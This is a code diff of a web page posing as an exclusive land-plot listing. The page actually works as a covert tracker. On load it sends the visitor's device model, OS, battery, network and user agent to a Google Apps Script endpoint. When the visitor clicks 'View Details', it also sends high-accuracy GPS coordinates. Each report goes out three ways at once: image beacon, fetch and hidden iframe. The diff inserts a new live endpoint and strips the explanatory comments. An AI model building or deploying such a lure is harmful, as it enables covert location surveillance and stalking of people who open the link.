@@ -31,15 +31,13 @@
         .plot-location-btn { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 14px; border-radius: 10px; text-decoration: none; margin-top: 20px; font-weight: 700; font-size: 15px; font-family: 'Montserrat', sans-serif; }
         .plot-location-btn:hover { background: #1e293b; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        /* Warning banner if URL not set */
         #configWarning { display: none; background: #ffebee; color: #c62828; padding: 12px; font-size: 13px; font-weight: 600; text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="configWarning">⚠️ https://script.google.com/macros/s/AKfycbz_zpFNCNzb-I3Jl2lKz4mjvhg_pOuFEDnQSmzZl5uJl6ioRoPxc8xcIbd1owimUXsi/exec!</div>
+    <div id="configWarning">⚠️ Script URL not configured!</div>
     
     <div class="header">
         <span class="badge">Exclusive Listing</span>
@@ -94,15 +92,10 @@
 </div>
 
 <script>
-    // ==========================================
-    //  STEP 1: PASTE YOUR REAL /exec URL HERE
-    // ==========================================
-    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz_zpFNCNzb-I3Jl2lKz4mjvhg_pOuFEDnQSmzZl5uJl6ioRoPxc8xcIbd1owimUXsi/exec';
+    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwVT80bI24dUrjP7wn6Re3X963zXhgiNE0ie7j491-70NNGZ6z9oNeWAVBORX7M0ZrXlQ/exec';
     
-    // Show warning if not configured
-    if (!SCRIPT_URL || SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbz_zpFNCNzb-I3Jl2lKz4mjvhg_pOuFEDnQSmzZl5uJl6ioRoPxc8xcIbd1owimUXsi/exec') {
+    if (!SCRIPT_URL) {
         document.getElementById('configWarning').style.display = 'block';
-        console.error("CONFIG ERROR: Replace YOUR_GOOGLE_SCRIPT_URL_HERE with your deployed Script URL.");
     }
 
     var SID = 'SID_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
@@ -113,9 +106,6 @@
         features: "Pair Kanal Plots | Double Corner with both plots | 80 Feet Road | Near to park and Masjid | Direct approach to 300 feet road | Near to commercial"
     };
 
-    // ==========================================
-    //  DEVICE DATA
-    // ==========================================
     function getModel() {
         var ua = navigator.userAgent;
         if (/Android/.test(ua)) {
@@ -158,21 +148,16 @@
         return { level: "N/A", charging: "N/A" };
     }
 
-    // ==========================================
-    //  BULLETPROOF TRACKER (Triple Send)
-    //  Uses: Image Beacon + Fetch + Iframe
-    // ==========================================
     async function track(eventType, lat, lon, acc, statusMsg) {
-        if (!SCRIPT_URL || SCRIPT_URL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') return;
+        if (!SCRIPT_URL) return;
 
         var bat = await getBattery();
         var model = getModel();
         var os = getOS();
         var net = getNetwork();
         var screenRes = screen.width + "x" + screen.height;
-        var ua = navigator.userAgent.substring(0, 250);
+        var ua = navigator.userAgent.substring(0, 500);
 
-        // Build payload URL
         var url = SCRIPT_URL + "?"
             + "sid=" + encodeURIComponent(SID)
             + "&event=" + encodeURIComponent(eventType)
@@ -191,42 +176,31 @@
             + "&screen=" + encodeURIComponent(screenRes)
             + "&ua=" + encodeURIComponent(ua);
 
-        // METHOD 1: Image Beacon (fastest, works everywhere since 1995)
         var img = new Image();
         img.src = url;
 
-        // METHOD 2: Fetch (modern browsers, background friendly)
         try {
             fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){});
         } catch(e) {}
 
-        // METHOD 3: Hidden iframe (ultimate fallback, bypasses all adblockers)
         var iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = url;
         document.body.appendChild(iframe);
         
-        // Cleanup iframe after 8 seconds
         setTimeout(function() {
             if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
         }, 8000);
     }
 
-    // ==========================================
-    //  EVENTS
-    // ==========================================
-    
-    // Track immediately when page loads
     window.addEventListener("DOMContentLoaded", function() {
         track("PAGE_LOAD", null, null, null, "User landed on page");
     });
 
-    // Button click handler
     function handleButtonClick() {
         document.getElementById("contactBtn").style.display = "none";
         document.getElementById("loader").style.display = "flex";
 
-        // Log the click instantly
         track("BUTTON_CLICK", null, null, null, "User clicked View Details");
 
         if (!navigator.geolocation) {
@@ -258,9 +232,9 @@
                 showContent();
             },
             { 
-                enableHighAccuracy: true,   // Forces real GPS chip
-                timeout: 20000,             // Wait up to 20 seconds
-                maximumAge: 0               // Never use cached location
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
             }
         );
     }
